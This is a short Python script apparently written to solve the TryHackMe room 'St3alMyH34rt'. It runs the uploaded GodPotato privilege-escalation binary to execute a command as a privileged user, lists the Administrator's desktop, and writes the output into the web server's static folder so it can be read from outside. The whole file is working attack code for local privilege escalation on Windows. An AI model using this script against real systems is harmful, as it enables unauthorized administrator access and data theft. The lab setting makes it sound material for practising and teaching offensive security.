#tryhackme room St3alMyH34rt 
# YouTube video walk throgh: https://youtu.be/odYTI5DxFc0
# Code by Claudi AI

import subprocess

godpotato = r"C:\valentine\uploads\GodPotato-NET4.exe"

r = subprocess.run(
    [godpotato, "-cmd", r'cmd /c dir C:\Users\Administrator\Desktop'],
    capture_output=True, text=True
)

with open(r"C:\valentine\static\result.txt", "w") as f:
    f.write(f"STDOUT:\n{r.stdout}\nSTDERR:\n{r.stderr}\n")
